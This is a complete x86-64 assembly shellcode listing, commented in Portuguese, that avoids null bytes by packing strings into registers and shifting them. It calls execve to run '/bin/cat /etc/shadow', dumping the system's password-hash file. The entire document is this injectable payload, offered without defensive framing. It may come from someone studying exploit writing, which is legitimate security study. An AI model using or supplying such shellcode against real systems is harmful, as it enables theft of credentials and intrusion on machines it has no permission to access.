global _start

_start:
	;sys_execve | rax=>0x3b, rdi=&fname, rsi=*args, rdx=0
	xor rsi, rsi
	mov rsi, 0x776f644141414141
	shr rsi, 0x28
	push rsi

	mov rsi, 0x6168732f6374652f
	push rsi

	mov rsi, rsp ;puxa endmem da string no rsi

	xor rdi, rdi
	push rdi ;nullterminator da string /bin/cat
	mov rdi, 0x7461632f6e69622f
	push rdi
	mov rdi, rsp ;puxa endmem da string no rdi

	xor rax, rax
	push rax ;nullterminator da array
	push rsi ;puxa os args na array
	push rdi ;puxa o filename na array

	mov rsi, rsp ;rsi fica com o pointer da array

	xor rax, rax
	add rax, 0x3b
	syscall
